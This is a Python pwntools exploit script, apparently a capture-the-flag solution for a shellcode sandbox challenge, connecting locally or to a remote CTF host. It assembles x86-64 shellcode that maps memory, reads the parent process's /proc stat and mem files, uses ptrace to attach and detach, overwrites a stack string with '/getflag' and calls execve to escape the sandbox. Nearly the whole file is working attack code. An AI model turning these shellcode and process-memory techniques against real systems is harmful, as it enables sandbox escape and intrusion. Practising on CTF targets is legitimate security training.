#!/usr/bin/env python3
from pwn import asm, context, process, remote
import argparse
import os
import re

context.clear(arch='amd64', os='linux')
context.log_level = 'error'

GETFLAG_STR_QWORD = 0x67616c667465672f  # b"/getflag" little-endian


def build_shellcode(arg_ptr: int) -> bytes:
    # Ensure the page(s) containing arg_ptr are mapped so the pointer is valid post-execve.
    page = arg_ptr & ~0xFFF

    sc = f"""
        mov rdi, {page}
        mov rsi, 0x2000
        mov rdx, 3
        mov r10, 0x32
        mov r8, -1
        xor r9, r9
        mov eax, 9
        syscall

        mov rbx, {arg_ptr}
        mov rax, {GETFLAG_STR_QWORD}
        mov qword ptr [rbx], rax
        xor eax, eax
        mov byte ptr [rbx+8], al

        lea rcx, [rbx+0x10]
        mov qword ptr [rcx], rbx
        mov qword ptr [rcx+8], rax

        mov rdi, rbx
        mov rsi, rcx
        xor rdx, rdx
        mov eax, 59
        syscall

        xor edi, edi
        mov eax, 60
        syscall
    """
    return asm(sc)


def build_shellcode_noleak(debug: bool = False) -> bytes:
    dbg0 = ""
    dbg_open = ""
    dbg1 = ""
    dbg2 = ""
    dbg3 = ""
    dbg4 = ""
    if debug:
        def w(ch: str) -> str:
            v = ord(ch)
            return f"""
                push {v}
                mov eax, 1
                mov edi, 1
                mov rsi, rsp
                mov edx, 1
                syscall
                add rsp, 8
            """

        dbg0 = w('0')      # after mmap
        dbg_open = w('1')  # after open maps
        dbg1 = w('2')      # after reading maps
        dbg2 = w('3')      # after locating [stack] line
        dbg3 = w('4')      # after locating chall string
        dbg4 = w('5')      # just before execve

    sc = f"""
        mov rdi, 0
        mov rsi, 0x80000
        mov rdx, 3
        mov r10, 0x22
        mov r8, -1
        mov r9, 0
        mov eax, 9
        syscall

        mov r15, rax
        lea rsp, [r15+0x80000-8]
        {dbg0}

        mov eax, 110
        syscall
        mov rbx, rax

        mov rdi, r15
        mov dword ptr [rdi], 0x6f72702f
        mov word ptr [rdi+4], 0x2f63
        mov rdi, r15
        add rdi, 0x40
        mov dword ptr [rdi], 0x6f72702f
        mov word ptr [rdi+4], 0x2f63

        mov rsi, r15
        add rsi, 0x80
        xor ecx, ecx
        mov rax, rbx
    gen_dig:
        xor edx, edx
        mov r8, 10
        div r8
        add dl, '0'
        mov byte ptr [rsi+rcx], dl
        inc ecx
        test rax, rax
        jnz gen_dig

        mov r9, rcx
        xor r10d, r10d
    copy_dig:
        cmp r10, r9
        je suf
        mov rax, r9
        dec rax
        sub rax, r10
        mov al, byte ptr [rsi+rax]
        mov byte ptr [r15+r10+6], al
        mov byte ptr [r15+r10+0x46], al
        inc r10
        jmp copy_dig

    suf:
        mov rdi, r15
        add rdi, r9
        add rdi, 6
        mov dword ptr [rdi], 0x6174732f
        mov word ptr [rdi+4], 0x0074
        mov rdi, r15
        add rdi, 0x40
        add rdi, r9
        add rdi, 6
        mov dword ptr [rdi], 0x6d656d2f
        mov byte ptr [rdi+4], 0

        mov rdi, r15
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall
        test eax, eax
        js fail
        mov ebp, eax
        {dbg_open}

        mov r14, r15
        add r14, 0x100
        mov edi, ebp
        mov rsi, r14
        mov edx, 0x1000
        xor eax, eax
        syscall
        test eax, eax
        js fail
        mov r12, rax

        mov edi, ebp
        mov eax, 3
        syscall
        {dbg1}

        lea rsi, [r14+r12-1]
        xor ecx, ecx
    next_num:
    skip_nd:
        cmp rsi, r14
        jbe fail
        mov al, byte ptr [rsi]
        cmp al, '0'
        jb dec1
        cmp al, '9'
        jbe parse_digits
    dec1:
        dec rsi
        jmp skip_nd

    parse_digits:
        xor r8, r8
        mov r9, 1
    dig_loop:
        mov al, byte ptr [rsi]
        cmp al, '0'
        jb done_num
        cmp al, '9'
        ja done_num
        movzx rax, al
        sub rax, '0'
        imul rax, r9
        add r8, rax
        imul r9, r9, 10
        dec rsi
        jmp dig_loop
    done_num:
        inc ecx
        cmp ecx, 4
        jne chk5
        mov r13, r8
    chk5:
        cmp ecx, 5
        jne next_num
        mov r12, r8

        mov rdi, r15
        add rdi, 0x40
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall
        test eax, eax
        jns mem_ok

        mov edi, 16
        mov rsi, rbx
        xor edx, edx
        xor r10d, r10d
        mov eax, 101
        syscall
        test eax, eax
        js fail

        mov rdi, rbx
        mov rsi, rsp
        xor edx, edx
        xor r10d, r10d
        mov eax, 61
        syscall

        mov rdi, r15
        add rdi, 0x40
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall
        test eax, eax
        js fail
        mov ebp, eax

        mov edi, 17
        mov rsi, rbx
        xor edx, edx
        xor r10d, r10d
        mov eax, 101
        syscall
        jmp mem_opened

    mem_ok:
        mov ebp, eax

    mem_opened:
        mov rax, r13
        sub rax, r12
        mov r9, 0x2000
        cmp rax, r9
        cmova rax, r9
        mov r9, rax

        mov edi, ebp
        mov rsi, r12
        xor edx, edx
        mov eax, 8
        syscall

        mov r14, r15
        add r14, 0x2000
        mov edi, ebp
        mov rsi, r14
        mov rdx, r9
        xor eax, eax
        syscall
        test eax, eax
        js fail
        mov r10, rax

        mov edi, ebp
        mov eax, 3
        syscall

        mov rdi, r14
        mov rcx, r10
        sub rcx, 6
        js fail
    s_chall:
        cmp dword ptr [rdi], 0x6c616863
        jne sc_next
        cmp word ptr [rdi+4], 0x006c
        je found
    sc_next:
        inc rdi
        dec rcx
        jns s_chall
        jmp fail

    found:
        {dbg2}
        mov rax, rdi
        sub rax, r14
        add rax, r12
        mov rbx, rax

        mov rdi, rbx
        and rdi, -4096
        mov rsi, 0x2000
        mov rdx, 3
        mov r10, 0x32
        mov r8, -1
        xor r9, r9
        mov eax, 9
        syscall

        mov rax, 0x67616c667465672f
        mov qword ptr [rbx], rax
        xor eax, eax
        mov byte ptr [rbx+8], al

        sub rsp, 0x20
        mov qword ptr [rsp], rbx
        mov qword ptr [rsp+8], 0

        mov rdi, rbx
        mov rsi, rsp
        xor rdx, rdx
        {dbg4}
        mov eax, 59
        syscall

    fail:
        xor edi, edi
        mov eax, 60
        syscall

    """
    return asm(sc)


def parse_leak(data: bytes) -> int | None:
    # Leak line format: 0x..............\n
    m = re.search(rb"0x[0-9a-fA-F]+", data)
    if not m:
        return None
    return int(m.group(0), 16)


def main():
    ap = argparse.ArgumentParser()
    mode = ap.add_mutually_exclusive_group()
    mode.add_argument('--remote', action='store_true', help='Force remote mode (TCP)')
    mode.add_argument('--local', action='store_true', help='Force local mode (spawn ./sandbox chall)')
    ap.add_argument('--host', default='challenges.1pc.tf')
    ap.add_argument('--port', default=30320, type=int)
    ap.add_argument('--local-cwd', default='sandboxed_dist/src')
    ap.add_argument('--force-noleak', action='store_true')
    ap.add_argument('--noleak-debug', action='store_true')
    args = ap.parse_args()

    default_host = 'challenges.1pc.tf'
    default_port = 30320
    local_cwd = os.path.abspath(args.local_cwd)
    local_sandbox = os.path.join(local_cwd, 'sandbox')

    # Auto mode:
    # - If user specified non-default host/port, assume they want remote.
    # - If local binary is missing, fall back to remote.
    # - Otherwise default to local (original behavior).
    if args.remote:
        use_remote = True
    elif args.local:
        use_remote = False
    else:
        host_port_changed = (args.host != default_host) or (args.port != default_port)
        local_exists = os.path.exists(local_sandbox)
        use_remote = host_port_changed or (not local_exists)

    if use_remote:
        io = remote(args.host, args.port)
    else:
        io = process([local_sandbox, 'chall'], cwd=local_cwd)

    # Read until the shellcode prompt; includes the leak line.
    data = io.recvuntil(b'Enter shellcode: ', timeout=3)
    arg_ptr = None if args.force_noleak else parse_leak(data)
    sc = build_shellcode(arg_ptr) if arg_ptr is not None else build_shellcode_noleak(debug=args.noleak_debug)
    io.send(sc)

    out = io.recvall(timeout=3)
    # Print everything we got after sending shellcode.
    try:
        print(out.decode('utf-8', errors='replace'), end='')
    except Exception:
        print(out)


if __name__ == '__main__':
    main()
